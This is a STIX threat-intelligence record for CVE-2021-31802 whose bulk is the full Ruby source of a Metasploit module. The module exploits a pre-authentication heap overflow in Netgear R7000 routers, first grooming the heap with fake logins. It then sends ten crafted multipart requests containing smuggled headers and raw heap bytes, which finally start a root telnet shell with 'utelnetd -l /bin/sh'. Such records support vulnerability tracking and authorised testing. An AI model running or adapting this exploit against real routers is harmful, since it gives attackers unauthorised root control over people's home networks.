{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--91683df5-e266-4ba5-8c4a-d3060eef606c",
    "created": "2024-08-14T16:23:31.145377Z",
    "modified": "2024-08-14T16:23:31.145381Z",
    "name": "Netgear R7000 backup.cgi Heap Overflow RCE",
    "description": " This module exploits a heap buffer overflow in the genie.cgi?backup.cgi page of Netgear R7000 routers running firmware version 1.0.11.116. Successful exploitation results in unauthenticated attackers gaining code execution as the root user.  The exploit utilizes these privileges to enable the telnet server which allows attackers to connect to the target and execute commands as the admin user from within a BusyBox shell. Users can connect to this telnet server by running the command \"telnet *target IP*\".  'License' => MSF_LICENSE 'Platform' => 'linux'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/netgear_r7000_backup_cgi_heap_overflow_rce.rb",
            "external_id": "netgear_r7000_backup_cgi_heap_overflow_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r7000-httpd-preauth-rce/"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-31802"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Netgear R7000 backup.cgi Heap Overflow RCE',\n        'Description' => %q{\n          This module exploits a heap buffer overflow in the genie.cgi?backup.cgi\n          page of Netgear R7000 routers running firmware version 1.0.11.116.\n          Successful exploitation results in unauthenticated attackers gaining\n          code execution as the root user.\n\n          The exploit utilizes these privileges to enable the telnet server\n          which allows attackers to connect to the target and execute commands\n          as the admin user from within a BusyBox shell. Users can connect to\n          this telnet server by running the command \"telnet *target IP*\".\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => 'linux',\n        'Author' => [\n          'colorlight2019', # Vulnerability Discovery and Exploit Code\n          'SSD Disclosure', # Vulnerabilty Writeup\n          'Grant Willcox (tekwizz123)' # Metasploit Module\n        ],\n        'DefaultTarget' => 0,\n        'Privileged' => true,\n        'Arch' => ARCH_ARMLE,\n        'Targets' => [\n          [ 'Netgear R7000 Firmware Version 1.0.11.116', {} ]\n        ],\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SERVICE_DOWN ],\n          'SideEffects' => [ CONFIG_CHANGES ]\n        },\n        'References' => [\n          [ 'URL', 'https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r7000-httpd-preauth-rce/'],\n          [ 'CVE', '2021-31802']\n        ],\n        'DisclosureDate' => '2021-04-21'\n      )\n      )\n\n    register_options(\n      [\n        Opt::RPORT(80)\n      ]\n    )\n\n    deregister_options('URIPATH')\n  end\n\n  def scrape(text, start_trig, end_trig)\n    text[/#{start_trig}(.*?)#{end_trig}/m, 1]\n  end\n\n  def retrieve_firmware_version\n    res = send_request_cgi({ 'uri' => '/currentsetting.htm' })\n    if res.nil?\n      return Exploit::CheckCode::Unknown('Connection timed out.')\n    end\n\n    data = res.to_s\n    firmware_version = data.match(/Firmware=V(\\d+\\.\\d+\\.\\d+\\.\\d+)(_(\\d+\\.\\d+\\.\\d+))?/)\n    if firmware_version.nil?\n      return Exploit::CheckCode::Unknown('Could not retrieve firmware version!')\n    end\n\n    firmware_version\n  end\n\n  def check_vuln_firmware\n    firmware_version = retrieve_firmware_version\n    firmware_version = Rex::Version.new(firmware_version[1])\n    if firmware_version <= Rex::Version.new('1.0.11.116') || firmware_version == Rex::Version.new('1.0.11.208') || firmware_version == Rex::Version.new('1.0.11.204')\n      return true\n    end\n\n    false\n  end\n\n  # Requests the login page which discloses the hardware. If it's an R7000 router, check if the firmware version is vulnerable.\n  def check\n    res = send_request_cgi({ 'uri' => '/' })\n    if res.nil?\n      return Exploit::CheckCode::Unknown('Connection timed out.')\n    end\n\n    # Checks for the `WWW-Authenticate` header in the response\n    if res.headers['WWW-Authenticate']\n      data = res.to_s\n      marker_one = 'Basic realm=\"NETGEAR '\n      marker_two = '\"'\n      model = scrape(data, marker_one, marker_two)\n      print_status(\"Router is a NETGEAR router (#{model})\")\n      if model == 'R7000' && check_vuln_firmware\n        return Exploit::CheckCode::Vulnerable\n      end\n\n    else\n      print_error('Router is not a NETGEAR router')\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def fake_logins_to_ease_heap\n    # This entire set of code is dedicated towards doing a series of invalid logins, which will result in the router\n    # showing a Router Password Reset page. This is needed since, as noted in SSD's blog post, the httpd program's\n    # heap state is different when a user is logged in or logged out via the web management portal, and supposively\n    # going through this process helps to make the heap state more clear and known.\n    i = 0\n    username = Rex::Text.rand_text_alphanumeric(6)\n    password = Rex::Text.rand_text_alphanumeric(18)\n    while (i < 3)\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => '/',\n        'cookie' => 'XSRF_TOKEN=1222440606',\n        'authorization' => basic_auth(username, password),\n        'headers' => {\n          'Connection' => 'close'\n        }\n      })\n      if res.nil?\n        return false\n      elsif (res.code == 200)\n        return true\n      end\n    end\n    return false\n  end\n\n  def send_payload\n    post_data = Rex::MIME::Message.new\n    post_data.add_part('a', nil, nil, nil)\n\n    post_data.bound = Rex::Text.rand_text_alphanumeric(32)\n\n    post_data.parts[0].header.headers[0] = [Rex::Text.rand_text_alpha(19).to_s, \"form-data; name=\\\"mtenRestoreCfg\\\"; filename=\\\"#{Rex::Text.rand_text_alpha(447)}\\\"\"]\n    send_data = post_data.to_s\n    send_data.sub!(/a\\r\\n--#{post_data.bound}--\\r\\n/, Rex::Text.rand_text_alpha(1))\n\n    res = send_request_cgi({\n      'method' => \"#{Rex::Text.rand_text_alpha(58698)}POST\",\n      'uri' => normalize_uri('cgi-bin', \"genie.cgi?backup.cgi\\nContent-Length: 4156559\"), # Note that we need this format for Content-Length otherwise the exploitation will fail :/\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'agent' => nil, # Disable sending the User-Agent header\n      'headers' => { 'Content-Disposition' => 'form-data', Rex::Text.rand_text_alpha(512) => Rex::Text.rand_text_alpha(9), 'Host' => \"#{datastore['RHOST']}:#{datastore['RPORT']}\" },\n      'data' => send_data\n    })\n\n    if !res.nil?\n      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded prematurely on the first packet, something wrong happened!')\n    end\n\n    post_data.parts[0].header.headers[0] = [Rex::Text.rand_text_alpha(19).to_s, \"form-data; name=\\\"mtenRestoreCfg\\\"; filename=\\\"#{Rex::Text.rand_text_alpha(439)}\\\"\"]\n    send_data = post_data.to_s\n    send_data.sub!(/a\\r\\n--#{post_data.bound}--\\r\\n/, Rex::Text.rand_text_alpha(1))\n\n    res = send_request_cgi({\n      'method' => \"#{Rex::Text.rand_text_alpha(58706)}POST\",\n      'uri' => normalize_uri('cgi-bin', \"genie.cgi?backup.cgi\\nContent-Length: 4156559\"), # Note that we need this format for Content-Length otherwise the exploitation will fail :/\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'agent' => nil, # Disable sending the User-Agent header\n      'headers' => { 'Content-Disposition' => 'form-data', Rex::Text.rand_text_alpha(512) => Rex::Text.rand_text_alpha(9), 'Host' => \"#{datastore['RHOST']}:#{datastore['RPORT']}\" },\n      'data' => send_data\n    })\n\n    if !res.nil?\n      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded prematurely on the second packet, something wrong happened!')\n    end\n\n    post_data.parts[0].header.headers[0] = [Rex::Text.rand_text_alpha(19).to_s, \"form-data; name=\\\"mtenRestoreCfg\\\"; filename=\\\"#{Rex::Text.rand_text_alpha(447)}\\\"\"]\n    post_data.parts[0].content = \"#{Rex::Text.rand_text_alpha(24)}\\xC0\\x03\\x00\\x00\\x28\\x00\\x00\\x00\"\n    send_data = post_data.to_s\n    send_data.sub!(/\\r\\n--#{post_data.bound}--\\r\\n/, '')\n\n    res = send_request_cgi({\n      'method' => \"#{Rex::Text.rand_text_alpha(58667)}POST\",\n      'uri' => normalize_uri('cgi-bin', \"genie.cgi?backup.cgi\\nContent-Length: 4156559\"), # Note that we need this format for Content-Length otherwise the exploitation will fail :/\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'agent' => nil, # Disable sending the User-Agent header\n      'headers' => { 'Content-Disposition' => 'form-data', Rex::Text.rand_text_alpha(512) => Rex::Text.rand_text_alpha(9), 'Host' => \"#{datastore['RHOST']}:#{datastore['RPORT']}\" },\n      'data' => send_data\n    })\n\n    if res.code != 200\n      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded with a non 200 OK response on the third packet!')\n    end\n\n    post_data.parts[0].header.headers[0] = ['Content-Disposition', \"form-data; name=\\\"StringFilepload\\\"; filename=\\\"#{Rex::Text.rand_text_alpha(256)}\\\"\"]\n    post_data.parts[0].content = \"\\xA0\\x03\\x00\\x00#{\"\\x20\" * 12}#{Rex::Text.rand_text_alpha(924)}\\x09\\x00\\x00\\x00\"\n    send_data = post_data.to_s\n    send_data.sub!(/\\r\\n--#{post_data.bound}--\\r\\n/, '')\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => '/genierestore.cgi',\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'agent' => nil, # Disable sending the User-Agent header\n      'headers' => { 'Host' => \"#{datastore['RHOST']}:#{datastore['RPORT']}\\r\\n#{Rex::Text.rand_text_alpha(512)}: #{Rex::Text.rand_text_alpha(9)}\" },\n      'data' => send_data\n    })\n\n    if res.code != 200\n      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded with a non 200 OK response on the fourth packet!')\n    end\n\n    post_data.parts[0].header.headers[0] = [Rex::Text.rand_text_alpha(19).to_s, \"form-data; name=\\\"mtenRestoreCfg\\\"; filename=\\\"#{Rex::Text.rand_text_alpha(447)}\\\"\"]\n    post_data.parts[0].content = ''\n    send_data = post_data.to_s\n    send_data.sub!(/\\r\\n--#{post_data.bound}--\\r\\n/, Rex::Text.rand_text_alpha(1))\n\n    res = send_request_cgi({\n      'method' => \"#{Rex::Text.rand_text_alpha(58698)}POST\",\n      'uri' => normalize_uri('cgi-bin', \"genie.cgi?backup.cgi\\nContent-Length: 4156559\"), # Note that we need this format for Content-Length otherwise the exploitation will fail, most likely due to a bad heap layout.\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'agent' => nil, # Disable sending the User-Agent header\n      'headers' => { 'Content-Disposition' => 'form-data', Rex::Text.rand_text_alpha(512) => Rex::Text.rand_text_alpha(9), 'Host' => \"#{datastore['RHOST']}:#{datastore['RPORT']}\" },\n      'data' => send_data\n    })\n\n    if !res.nil?\n      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded prematurely on the fifth packet, something wrong happened!')\n    end\n\n    post_data.parts[0].header.headers[0] = ['Content-Disposition', \"form-data; name=\\\"StringFilepload\\\"; filename=\\\"#{Rex::Text.rand_text_alpha(256)}\\\"\"]\n    post_data.parts[0].content = \"\\x20\\x00\\x00\\x00#{\"\\x20\" * 12}a\"\n    send_data = post_data.to_s\n    send_data.sub!(/\\r\\n--#{post_data.bound}--\\r\\n/, '')\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => '/genierestore.cgi',\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'agent' => nil, # Disable sending the User-Agent header\n      'headers' => { 'Host' => \"#{datastore['RHOST']}:#{datastore['RPORT']}\\r\\n#{Rex::Text.rand_text_alpha(512)}: #{Rex::Text.rand_text_alpha(9)}\" },\n      'data' => send_data\n    })\n\n    if res.code != 200\n      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded with a non 200 OK response on the sixth packet!')\n    end\n\n    post_data.parts[0].header.headers[0] = ['Content-Disposition', \"form-data; name=\\\"StringFilepload\\\"; filename=\\\"#{Rex::Text.rand_text_alpha(256)}\\\"\"]\n    post_data.parts[0].content = \"\\x48\\x00\\x00\\x00#{\"\\x20\" * 12}a\"\n    send_data = post_data.to_s\n    send_data.sub!(/\\r\\n--#{post_data.bound}--\\r\\n/, '')\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => '/genierestore.cgi',\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'agent' => nil, # Disable sending the User-Agent header\n      'headers' => { 'Host' => \"#{datastore['RHOST']}:#{datastore['RPORT']}\\r\\n#{Rex::Text.rand_text_alpha(512)}: #{Rex::Text.rand_text_alpha(9)}\" },\n      'data' => send_data\n    })\n\n    if res.code != 200\n      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded with a non 200 OK response on the seventh packet!')\n    end\n\n    post_data.parts[0].header.headers[0] = [Rex::Text.rand_text_alpha(19).to_s, \"form-data; name=\\\"mtenRestoreCfg\\\"; filename=\\\"#{Rex::Text.rand_text_alpha(439)}\\\"\"]\n    post_data.parts[0].content = \"#{Rex::Text.rand_text_alpha(36)}\\x51\\x00\\x00\\x00\\xd8\\x08\\x12\\x00\"\n    send_data = post_data.to_s\n    send_data.sub!(/\\r\\n--#{post_data.bound}--\\r\\n/, '')\n\n    res = send_request_cgi({\n      'method' => \"#{Rex::Text.rand_text_alpha(58663)}POST\",\n      'uri' => normalize_uri('cgi-bin', \"genie.cgi?backup.cgi\\nContent-Length: 4156559\"), # Note that we need this format for Content-Length otherwise the exploitation will fail, most likely due to a bad heap layout.\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'agent' => nil, # Disable sending the User-Agent header\n      'headers' => { 'Content-Disposition' => 'form-data', Rex::Text.rand_text_alpha(512) => Rex::Text.rand_text_alpha(9), 'Host' => \"#{datastore['RHOST']}:#{datastore['RPORT']}\" },\n      'data' => send_data\n    })\n\n    if res.code != 200\n      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded with a non 200 OK response on the eighth packet!')\n    end\n\n    post_data.parts[0].header.headers[0] = [Rex::Text.rand_text_alpha(19).to_s, \"form-data; name=\\\"mtenRestoreCfg\\\"; filename=\\\"#{Rex::Text.rand_text_alpha(399)}\\\"\"]\n    post_data.parts[0].content = ''\n    send_data = post_data.to_s\n    send_data.sub!(/\\r\\n--#{post_data.bound}--\\r\\n/, Rex::Text.rand_text_alpha(1))\n\n    res = send_request_cgi({\n      'method' => \"#{Rex::Text.rand_text_alpha(58746)}POST\",\n      'uri' => normalize_uri('cgi-bin', \"genie.cgi?backup.cgi\\nContent-Length: 4156559\"), # Note that we need this format for Content-Length otherwise the exploitation will fail, most likely due to a bad heap layout.\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'agent' => nil, # Disable sending the User-Agent header\n      'headers' => { 'Content-Disposition' => 'form-data', Rex::Text.rand_text_alpha(512) => Rex::Text.rand_text_alpha(9), 'Host' => \"#{datastore['RHOST']}:#{datastore['RPORT']}\" },\n      'data' => send_data\n    })\n\n    if !res.nil?\n      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded on the ninth packet!')\n    end\n\n    post_data.parts[0].header.headers[0] = ['Content-Disposition', \"form-data; name=\\\"StringFilepload\\\"; filename=\\\"#{Rex::Text.rand_text_alpha(256)}\\\"\"]\n    post_data.parts[0].content = \"\\x48\\x00\\x00\\x00#{\"\\x20\" * 12}utelnetd -l /bin/sh#{\"\\x00\" * 45}\\x04\\xe8\\x00\\x00\"\n    send_data = post_data.to_s\n    send_data.sub!(/\\r\\n--#{post_data.bound}--\\r\\n/, '')\n\n    print_status('Sending 10th and final packet...')\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => '/genierestore.cgi',\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'agent' => nil, # Disable sending the User-Agent header\n      'headers' => { 'Host' => \"#{datastore['RHOST']}:#{datastore['RPORT']}\\r\\n#{Rex::Text.rand_text_alpha(512)}: #{Rex::Text.rand_text_alpha(9)}\" },\n      'data' => send_data\n    }, 0)\n\n    print_status(\"If the exploit succeeds, you should be able to connect to the telnet shell by running: telnet #{datastore['RHOST']}\")\n  end\n\n  def run\n    firmware_version = retrieve_firmware_version\n\n    firmware_version = Rex::Version.new(firmware_version[1])\n    if firmware_version != Rex::Version.new('1.0.11.116')\n      fail_with(Failure::NoTarget, 'Sorry but at this point in time only version 1.0.11.116 of the R7000 firmware is exploitable with this module!')\n    end\n\n    unless fake_logins_to_ease_heap # Set the heap to a more predictable state via a series of fake logins.\n      fail_with(Failure::UnexpectedReply, 'The target R7000 router did not send us the expected 200 OK response after 3 invalid login attempts!')\n    end\n\n    send_payload\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-04-21"
}